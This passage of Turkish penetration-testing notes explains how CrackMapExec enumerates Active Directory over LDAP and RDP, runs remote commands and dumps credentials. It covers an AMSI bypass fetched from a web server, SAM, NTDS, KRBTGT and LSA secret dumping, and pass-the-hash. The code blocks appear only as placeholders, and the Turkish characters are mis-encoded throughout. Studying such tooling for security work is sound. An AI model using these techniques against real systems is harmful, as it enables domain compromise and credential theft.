AÅŸaÄŸÄ±daki bÃ¶lÃ¼m LDAP ve RDP protokollerini kullanarak numaralandÄ±rmayÄ± kapsayacaktÄ±r.

----


### LDAP and RDP Enumeration

Daha Ã¶nce, CrackMapExec'te en Ã§ok kullanÄ±lan protokol olan `SMB` ile bazÄ± numaralandÄ±rma seÃ§eneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandÄ±rma seÃ§eneÄŸi vardÄ±r

Bu bÃ¶lÃ¼mde, bu seÃ§eneklerden bazÄ±larÄ± ve hedeflerimizi nasÄ±l daha fazla numaralandÄ±rabileceÄŸimiz gÃ¶sterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aÅŸaÄŸÄ±daki seÃ§enekleri iÃ§erir:

| Komut                                                                          | AÃ§Ä±klama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`                  | Etkin Domain kullanÄ±cÄ±larÄ±nÄ± listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`                 | Domain gruplarÄ±nÄ± listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayraÄŸÄ± olan kullanÄ±cÄ±larÄ± listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± olan kullanÄ±cÄ± ve bilgisyalarÄ±nÄ± listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --get-sid`                | Domainin SID bilgisini alÄ±r.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --gmsa`                   | GMSA (GruplandÄ±rÄ±lmÄ±ÅŸ YÃ¶netici Hizmet HesaplarÄ±) ÅŸifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --nla-screenshot`          | NLA (AÄŸ Seviyesinde Kimlik DoÄŸrulamasÄ±) devre dÄ±ÅŸÄ± ise RDP giriÅŸ ekranÄ±nÄ±n ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r. |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screenshot`              | BaÄŸlantÄ± baÅŸarÄ±lÄ±ysa RDP oturumunun ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r.                                        |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screentime`              | MasaÃ¼stÃ¼ gÃ¶rÃ¼ntÃ¼sÃ¼ iÃ§in bekleme sÃ¼resini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --res RES`                 | Ã‡Ã¶zÃ¼nÃ¼rlÃ¼k belirler (Ã¶rnek format: WIDTHxHEIGHT, varsayÄ±lan: 1024x768).                            |

HenÃ¼z Ã§alÄ±ÅŸmadÄ±klarÄ±mÄ±z varsa onlarÄ± gÃ¶zden geÃ§irelim.

### Enumerating Users and Groups

SMB protokolÃ¼nde yaptÄ±ÄŸÄ±mÄ±z gibi, `LDAP` ile de kullanÄ±cÄ±larÄ± ve gruplarÄ± listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini Ã§Ã¶zÃ¼mleyemezsek LDAP protokol iletiÅŸimlerinin Ã§alÄ±ÅŸmayacaÄŸÄ±nÄ± unutmayÄ±n. Domain DNS sunucularÄ±na baÄŸlanmÄ±yorsak, FQDN'yi `/etc/hosts` dosyasÄ±nda yapÄ±landÄ±rmamÄ±z gerekir


### Ä°lginÃ§ Hesap Ã–zelliklerini NumaralandÄ±rma

`ldap` protokolÃ¼, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± ile hesaplarÄ± tanÄ±mlamamÄ±za yardÄ±mcÄ± olacak birkaÃ§ seÃ§eneÄŸe daha sahiptir ve hatta `adminCount` deÄŸeri `1` olan tÃ¼m hesaplarÄ± sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmÄ±ÅŸsa, kullanÄ±cÄ± geÃ§erli password policy uzunluÄŸuna tabi deÄŸildir, yani daha kÄ±sa bir parolaya sahip olabilir veya hiÃ§ parola kullanmayabilir (domain'de boÅŸ parolalara izin veriliyorsa). Bu hesaplarÄ± tanÄ±mlamak iÃ§in  `--password-notrequired` seÃ§eneÄŸini kullanabiliriz.


### PASSWD_NOTREQD Attribute TanÄ±mlanmasÄ±

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanÄ±rsa, bir servisin altÄ±nda Ã§alÄ±ÅŸtÄ±ÄŸÄ± servis hesabÄ± (kullanÄ±cÄ± veya bilgisayar) Kerberos yetkilendirmesi iÃ§in gÃ¼venilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldÄ±rÄ± tÃ¼rÃ¼ne `Kerberos Unconstrained Delegation` adÄ± verilir. Bu konu hakkÄ±nda daha fazla bilgi edinmek iÃ§in bu [blog](https://adsecurity.org/?p=1667) yazÄ±sÄ±nÄ± okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

`AdminCount` attribute, SDProp process'in bir kullanÄ±cÄ±yÄ± koruyup korumadÄ±ÄŸÄ±nÄ± belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar iÃ§in ACL permissions'Ä±n bir template'i olarak gÃ¶rev yapar. EÄŸer herhangi bir account ACE'si (Ã¶rneÄŸin, bir attacker tarafÄ±ndan) modified edilirse, bu process tarafÄ±ndan korunan account'larÄ±n ACL permissions'Ä±, `SDProp` process her Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda (default olarak her 60 dakikada bir Ã§alÄ±ÅŸÄ±r, ancak bu sÃ¼re modified edilebilir) templated permission set'e resetlenir. User, adminCount deÄŸeri 0 olarak set edilmiÅŸse veya specified deÄŸilse bu koruma kapsamÄ±na girmez. EÄŸer attribute value 1 olarak set edilmiÅŸse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'larÄ± target olarak arar. Bunlar genellikle privileged account'lardÄ±r ve further access veya full domain compromise ile sonuÃ§lanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandÄ±rma

BazÄ± domain attack'larÄ±, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'Ä±n sizi tanÄ±mlamak iÃ§in kullandÄ±ÄŸÄ± `unique bir ID` numarasÄ±dÄ±r. Domain SID ise domain'i tanÄ±mlayan unique bir ID numarasÄ±dÄ±r. CrackMapExec kullanarak domain SID'i elde etmek iÃ§in `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

BaÄŸÄ±msÄ±z YÃ¶netilen Hizmet HesabÄ± (standalone Managed Service Account) (sMSA), aÅŸaÄŸÄ±dakileri saÄŸlayan yÃ¶netilen bir domain hesabÄ±dÄ±r:

* Otomatik parola yÃ¶netimi.
* BasitleÅŸtirilmiÅŸ service principal name (SPN) yÃ¶netimi.
* YÃ¶netimi diÄŸer yÃ¶neticilere devretme yeteneÄŸi

Bu yÃ¶netilen servis hesabÄ± (MSA) tÃ¼rÃ¼ Windows Server 2008 R2 ve Windows 7'de tanÄ±tÄ±lmÄ±ÅŸtÄ±r.

Group Managed Service Account (gMSA) domain iÃ§inde aynÄ± iÅŸlevselliÄŸi saÄŸlar ancak aynÄ± zamanda bu iÅŸlevselliÄŸi birden fazla sunucuya geniÅŸletir.

Bir gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuma ayrÄ±calÄ±klarÄ±na sahip bir hesabÄ± belirlemek iÃ§in PowerShell'i kullanabiliriz (komut yÃ¼rÃ¼tmeyi bir sonraki bÃ¶lÃ¼mde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


YukarÄ±daki Ã¶rnekte, `engels` kullanÄ±cÄ±sÄ±nÄ±n `PrincipalsAllowedToRetrieveManagedPassword` ayrÄ±calÄ±ÄŸÄ±na sahip olduÄŸunu gÃ¶rebiliriz, bu da `svc_inlaneadm$` gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuyabileceÄŸi anlamÄ±na gelir. gMSA parolasÄ±nÄ± okuma hakkÄ±na sahip bir hesabÄ± tehlikeye atarsak, hesabÄ±n `NTLM` parola hash'ini almak iÃ§in `--gmsa` seÃ§eneÄŸini kullanabiliriz.


### gMSA ParolasÄ±nÄ± Edinme

{{CODE_BLOCK_143}}

Bu kimlik bilgilerini kullanmak iÃ§in, hash'ler iÃ§in -H seÃ§eneÄŸini kullanabiliriz.

### svc_inlaneadm$ HesabÄ± ile PaylaÅŸÄ±lan KlasÃ¶rleri Ä°nceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolÃ¼ aracÄ±lÄ±ÄŸÄ±yla kullanÄ±cÄ± adlarÄ±nÄ± numaralandÄ±rmak iÃ§in CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnÄ±zca `NLA` ile izin verme seÃ§eneÄŸi devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸsa, oturum aÃ§ma isteminin ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ almak iÃ§in `--nlascreenshot` seÃ§eneÄŸini kullanabiliriz


### Enumerate Login Prompt

{{CODE_BLOCK_145}}

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz.


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

EÄŸer bir kullanÄ±cÄ± adÄ± ve parolamÄ±z varsa, `--screenshot` seÃ§eneÄŸi ile RDP protokolÃ¼nÃ¼ kullanarak da ekran gÃ¶rÃ¼ntÃ¼sÃ¼ alabiliriz. Bu seÃ§enek `--screentime` ile birleÅŸtirilebilir, varsayÄ±lan olarak `10`, RDP baÄŸlantÄ±sÄ± aÃ§Ä±ldÄ±ktan sonra ekran gÃ¶rÃ¼ntÃ¼sÃ¼ almak iÃ§in bekleyeceÄŸi sÃ¼redir. Bu, bir hedef makineye baÄŸlandÄ±ÄŸÄ±mÄ±zda ve hedefin masaÃ¼stÃ¼nÃ¼ yÃ¼klemesi 10 saniyeden fazla sÃ¼rdÃ¼ÄŸÃ¼nde kullanÄ±ÅŸlÄ±dÄ±r.

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ seÃ§eneÄŸiyle birleÅŸtirilebilecek bir diÄŸer seÃ§enek de RDP baÄŸlantÄ±sÄ± sÄ±rasÄ±ndaki ekran Ã§Ã¶zÃ¼nÃ¼rlÃ¼ÄŸÃ¼ne karÅŸÄ±lÄ±k gelen `--res` seÃ§eneÄŸidir. Bu seÃ§enek yararlÄ±dÄ±r Ã§Ã¼nkÃ¼ aktif bir RDP oturumu bulursak, kullanÄ±cÄ±nÄ±n ekranÄ±nÄ±n boyutuna baÄŸlÄ± olarak tÃ¼m iÃ§eriÄŸi gÃ¶rebiliriz veya gÃ¶remeyiz. VarsayÄ±lan olarak bu seÃ§enek `1024x768` olarak ayarlanmÄ±ÅŸtÄ±r


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteÄŸe baÄŸlÄ± bayraklardÄ±r.

Son olarak, ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz:


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in GÃ¶zÃ¼nÃ¼ Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bÃ¶lÃ¼mde, hedeflerimize ulaÅŸmamÄ±za yardÄ±mcÄ± olabilecek LDAP ve RDP kullanarak Ã§eÅŸitli numaralandÄ±rma seÃ§eneklerini inceledik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼m, CrackMapExec kullanarak komutlarÄ±n nasÄ±l Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ±nÄ± gÃ¶zden geÃ§irecektir.


---

### Command Execution

Remote target Ã¼zerinde local administrator olarak bir komut Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸmadan Ã¶nce `UAC`'nin varlÄ±ÄŸÄ±nÄ± kontrol etmeliyiz. UAC etkinleÅŸtirildiÄŸinde, ki bu varsayÄ±lan durumdur, yalnÄ±zca `RID 500`'e sahip administrator hesabÄ± (varsayÄ±lan administrator) remote komutlarÄ± yÃ¼rÃ¼tebilir. Durumun bÃ¶yle olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in iki registry key vardÄ±r:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

VarsayÄ±lan olarak, `LocalAccountTokenFilterPolicy` deÄŸeri 0 olarak ayarlanmÄ±ÅŸtÄ±r, yani yalnÄ±zca built-in administrator hesabÄ± (RID 500) administration gÃ¶revlerini gerÃ§ekleÅŸtirebilir. Local administrator grubunda olsak bile, yalnÄ±zca kullanÄ±cÄ±mÄ±zÄ±n RID'si `500` ise remote komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. DeÄŸer 1 olarak ayarlanÄ±rsa tÃ¼m administrative hesaplarÄ± yÃ¶netim gÃ¶revlerini yÃ¼rÃ¼tebilir.

Administrator yapÄ±landÄ±rabileceÄŸi bir diÄŸer ayar da local administrator hesabÄ±nÄ±n (RID 500) remote yÃ¶netim gÃ¶revlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry deÄŸerini 1 olarak ayarlayarak yapÄ±labilir; bu, built-in administrator hesabÄ±nÄ±n (RID 500) remote administrative tasks (remote yÃ¶netim gÃ¶revleri) gerÃ§ekleÅŸtiremeyeceÄŸi anlamÄ±na gelir.


### Administrator Olarak Komut YÃ¼rÃ¼tme

KomutlarÄ± Ã§alÄ±ÅŸtÄ±rmak ve administrators grubuna kimlerin Ã¼ye olduÄŸunu gÃ¶rmek iÃ§in Administrator hesabÄ±nÄ± kullanalÄ±m. Windows komut satÄ±rÄ± komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in `-x` seÃ§eneÄŸini ve ardÄ±ndan Ã§alÄ±ÅŸtÄ±rmak istediÄŸimiz komutu kullanmamÄ±z gerekir.


### Bir Komutu Administrator Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut YÃ¼rÃ¼tme

YukarÄ±daki komutta, `localadmin` local user `Administrators` grubundadÄ±r, ancak remote komutu Ã§alÄ±ÅŸtÄ±ramaz:

### Komutu localadmin olarak Ã§alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduÄŸu anlamÄ±na gelir. EÄŸer durum bÃ¶yleyse, hesap administrator olsa bile (Pwn3d!) mesajÄ±nÄ± almayacaÄŸÄ±z. Bu ayarÄ± geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi DeÄŸiÅŸtirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain HesabÄ± Olarak Komut YÃ¼rÃ¼tme

`LocalAccountTokenFilterPolicy` yalnÄ±zca local hesaplar iÃ§in geÃ§erlidir. Bir domain kullanÄ±cÄ±mÄ±z varsa ve `administrators` grubunun bir parÃ§asÄ±ysa, UAC ayarÄ±yla bile komutu Ã§alÄ±ÅŸtÄ±rabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabÄ± `administrators` `grubunun` bir Ã¼yesidir, yani UAC etkin olsa bile komutlarÄ± yÃ¼rÃ¼tebilir.


### Komutu Robert olarak Ã§alÄ±ÅŸtÄ±r

{{CODE_BLOCK_153}}


### SMB ile Komut YÃ¼rÃ¼tme

CME'nin dÃ¶rt (4) farklÄ± komut yÃ¼rÃ¼tme yÃ¶ntemi vardÄ±r:

| Komut   | AÃ§Ä±klama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanÄ±larak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`diskte dosya oluÅŸturulur`).                               |
| atexec  | Windows `gÃ¶rev zamanlayÄ±cÄ±sÄ±` ile bir gÃ¶rev planlayarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz). |
| smbexec | Bir servis oluÅŸturup Ã§alÄ±ÅŸtÄ±rarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz).                       |
| mmcexec | wmiexec yÃ¶ntemine benzer, ancak komutlar Microsoft YÃ¶netim Konsolu (MMC) aracÄ±lÄ±ÄŸÄ±yla yÃ¼rÃ¼tÃ¼lÃ¼r.                                     |

Not: Her yÃ¶ntem her bilgisayarda Ã§alÄ±ÅŸmayabilir.

VarsayÄ±lan olarak, CME biri baÅŸarÄ±sÄ±z olursa farklÄ± bir yÃ¼rÃ¼tme yÃ¶ntemine geÃ§ecektir. KomutlarÄ± aÅŸaÄŸÄ±daki sÄ±rayla yÃ¼rÃ¼tmeye Ã§alÄ±ÅŸÄ±r:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnÄ±zca bir yÃ¼rÃ¼tme yÃ¶ntemi kullanmaya zorlamak istiyorsak, Ã¶rneÄŸin `--exec-method` bayraÄŸÄ±nÄ± kullanarak hangisini kullanacaÄŸÄ±mÄ±zÄ± belirtebiliriz:


### SMBExec YÃ¶ntemi ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seÃ§eneÄŸini kullanarak PowerShell ile komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz:

### wmiexec aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_155}}


PowerShell seÃ§eneÄŸi -X Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, perde arkasÄ±nda `CrackMapExec` aÅŸaÄŸÄ±dakileri yapacaktÄ±r:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Ã–zel AMSI Bypass Ã‡alÄ±ÅŸtÄ±rma

Bu teknikler `PowerShell` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken algÄ±lanabilir. Ã–zel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seÃ§eneÄŸini ve ardÄ±ndan kullanmak istediÄŸimiz payload'un yolunu kullanabiliriz. Ã–rneÄŸin, [AMSI Bypass DeÄŸiÅŸtirilmiÅŸ Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) YamasÄ±nÄ± kullanalÄ±m. Bunu bir dosyaya kaydedeceÄŸiz ve bu AMSI Bypass'Ä± bir web sunucusundan belleÄŸe yÃ¼klemek iÃ§in bir PowerShell scripti oluÅŸturacaÄŸÄ±z. Ä°ÅŸte adÄ±mlar:

*  â€œModified Amsi ScanBuffer Patchâ€ iÃ§eren dosyayÄ± indirin


### â€œModified Amsi ScanBuffer Patchâ€ ile Bir Dosya OluÅŸturun

{{CODE_BLOCK_156}}


Payload'u olduÄŸu gibi Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸÄ±rsak, komut maksimum uzunluk olan 8191 karakteri aÅŸacaÄŸÄ± iÃ§in baÅŸarÄ±sÄ±z olacaktÄ±r

### Komut Maksimum UzunluÄŸu AÅŸÄ±yor

{{CODE_BLOCK_157}}

* Bu sorunu Ã§Ã¶zmek iÃ§in, `shantanukhande-amsi.ps1` dosyasÄ±nÄ± indiren ve Ã§alÄ±ÅŸtÄ±ran bir PowerShell scripti oluÅŸturalÄ±m. AyrÄ±ca scriptimizi barÄ±ndÄ±rmak iÃ§in bir Python web sunucusu oluÅŸturmamÄ±z gerekecek.

### PowerShell Komut DosyasÄ±nÄ± OluÅŸturma ve BarÄ±ndÄ±rma

{{CODE_BLOCK_158}}


Not: Sonuna noktalÄ± virgÃ¼l (;) eklediÄŸinizden emin olun.

BaÅŸka bir terminalden, yeni AMSI bypass payload'umuzu Ã§alÄ±ÅŸtÄ±ralÄ±m:

### PowerShell Ã–zel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut YÃ¼rÃ¼tme

WinRM protokolÃ¼ ile de komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. VarsayÄ±lan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yÄ± dinler. Bu protokolle ilgili Ã¶zel bir ÅŸey, bir kullanÄ±cÄ±nÄ±n komutlarÄ± yÃ¼rÃ¼tmek iÃ§in `administrator` olmasÄ±nÄ± gerektirmemesidir. `Administrators` grubunun Ã¼yesiysek, `Remote Management Users` grubunun Ã¼yesiysek veya oturum yapÄ±landÄ±rmasÄ±nda aÃ§Ä±k `PowerShell Remoting` izinlerimiz varsa WinRM protokolÃ¼nÃ¼ kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yÃ¼rÃ¼tme ile kullanabileceÄŸimiz Ã§eÅŸitli seÃ§enekler vardÄ±r. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

| SeÃ§enek           | AÃ§Ä±klama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM baÄŸlantÄ±sÄ± iÃ§in Ã¶zel bir port seÃ§mek.             |
| --ssl             | SSL etkinleÅŸtirilmiÅŸ WinRM'ye baÄŸlanmak.                |
| --ignore-ssl-cert | SSL ile baÄŸlanÄ±rken sertifika doÄŸrulamasÄ±nÄ± yok saymak. |

Not: WinRM protokolÃ¼ farklÄ± yÃ¼rÃ¼tme yÃ¶ntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows Ã¼zerinde komutlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in SSH protokolÃ¼nÃ¼ de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

Bir SSH sunucusuyla etkileÅŸime girmenin bir baÅŸka yaygÄ±n yolu da `public` ve `private` keyleri kullanmaktÄ±r. CrackMapExec, `--key-file` seÃ§eneÄŸi ile `private key` kullanÄ±mÄ±nÄ± destekler. AnahtarÄ±n Ã§alÄ±ÅŸmasÄ± iÃ§in `OPENSSH` formatÄ±nda olmasÄ± gerekir.

### Private Key Kullanarak SSH ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_163}}

Not: Herhangi bir parola yapÄ±landÄ±rÄ±lmamÄ±ÅŸsa, `-p` seÃ§eneÄŸini boÅŸ `(â€œâ€)` olarak ayarlamalÄ±yÄ±z, aksi takdirde bir hata alÄ±rÄ±z

Bu bÃ¶lÃ¼mde, CrackMapExec kullanarak komutlarÄ± yÃ¼rÃ¼tmek iÃ§in Ã¼Ã§ farklÄ± protokol keÅŸfettik ve daha Ã¶nce komutlarÄ± yÃ¼rÃ¼tmek iÃ§in MSSQL'in nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± tartÄ±ÅŸtÄ±k. YazÄ±m sÄ±rasÄ±nda, CrackMapExec komutlarÄ± yÃ¼rÃ¼tmek iÃ§in diÄŸer dÃ¶rt protokolÃ¼ desteklemektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in kimlik bilgilerini ayÄ±klamak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± tartÄ±ÅŸÄ±lacaktÄ±r.


### Gizli Bilgileri Bulma ve Kullanma

Parola Ã§Ä±karma sÃ¶z konusu olduÄŸunda, CrackMapExec oldukÃ§a gÃ¼Ã§lÃ¼dÃ¼r. On workstation ele geÃ§irdiÄŸimizi ve tÃ¼mÃ¼nden kimlik bilgilerini almak iÃ§in LSASS process'inin belleÄŸini dump istediÄŸimizi dÃ¼ÅŸÃ¼nelim; CrackMapExec bunu yapabilir.

Bu bÃ¶lÃ¼mde, CrackMapExec'in Windows kimlik bilgilerini dump iÃ§in sunduÄŸu yÃ¶ntemleri inceleyeceÄŸiz.


### SAM

SAM database, tÃ¼m local kullanÄ±cÄ±larÄ±n kimlik bilgilerini iÃ§erir ve birÃ§ok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandÄ±ÄŸÄ± iÃ§in bunlarÄ± ele geÃ§irmek kritik Ã¶neme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanÄ±labilen `--sam` seÃ§eneÄŸini kullanarak SAM database iÃ§eriÄŸini hÄ±zlÄ± bir ÅŸekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alÄ±nabileceÄŸi bir baÅŸka yer de Active Directory veritabanÄ±dÄ±r. ntds.dit dosyasÄ±, kullanÄ±cÄ± objeleri, gruplar ve grup Ã¼yeliÄŸi hakkÄ±ndaki bilgiler de dahil olmak Ã¼zere Active Directory verilerini depolayan bir veritabanÄ±dÄ±r. Ã–zellikle, dosya aynÄ± zamanda domain'deki tÃ¼m kullanÄ±cÄ±lar iÃ§in parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap iÃ§in [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleÅŸtirilmiÅŸse aÃ§Ä±k metin parolalarÄ±nÄ± da saklar). Bir Domain Admin hesabÄ±na veya bir replikasyon/DCSync gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahip baÅŸka bir hesaba eriÅŸimimiz varsa, bir Domain Controller'dan hash'leri dÃ¶kebiliriz

Hash'leri dump etmek iÃ§in `--ntds` seÃ§eneÄŸini kullanmamÄ±z gerekir, aÅŸaÄŸÄ±daki Ã¶rnekte `robert` kullanÄ±cÄ±sÄ± bir Domain Admin deÄŸildir, ancak `replikasyon` gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahiptir.

### Domain Controller Ã¼zerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seÃ§eneÄŸini kullanÄ±rken `--user` ve `--enabled` seÃ§eneklerini dahil edebiliriz. EÄŸer `--user` kullanÄ±rsak ayÄ±klamak istediÄŸimiz kullanÄ±cÄ±yÄ± belirtebiliriz. KRBTGT hesabÄ± iÃ§in hash dump alalÄ±m.

### YalnÄ±zca KRBTGT HesabÄ±nÄ±n Dump Edilmesi

{{CODE_BLOCK_166}}

EÄŸer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanÄ±cÄ±larÄ± gÃ¶sterecek ve bize etkin kullanÄ±cÄ±larÄ±n listesini Ã§Ä±karma seÃ§eneÄŸi sunacaktÄ±r.


### YalnÄ±zca Enabled HesaplarÄ± GÃ¶sterme

{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiÄŸimiz ÅŸifreler NTLM hash'leridir. Hash'leri kÄ±rmayÄ± deneyebilir veya parolayÄ± kÄ±rmadan kullanÄ±cÄ± olarak kimlik doÄŸrulamasÄ± yapmak iÃ§in `Pass the Hash` tekniÄŸini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doÄŸrulama yÃ¶ntemi olarak bir NTLM hash'i gerektiren `-H` seÃ§eneÄŸine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doÄŸrulamasÄ± SMB, WinRM , RDP, LDAP ve MSSQL protokolleri iÃ§in desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent Ã§alÄ±ÅŸtÄ±rmadan hash dump iÅŸlemi gerÃ§ekleÅŸtiren `impacket-secretsdump`'tan alÄ±nmÄ±ÅŸ `--lsa` seÃ§eneÄŸiyle birlikte gelir. Bu seÃ§enek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak Ã¼zere LSA Secrets'Ä± dump eder.

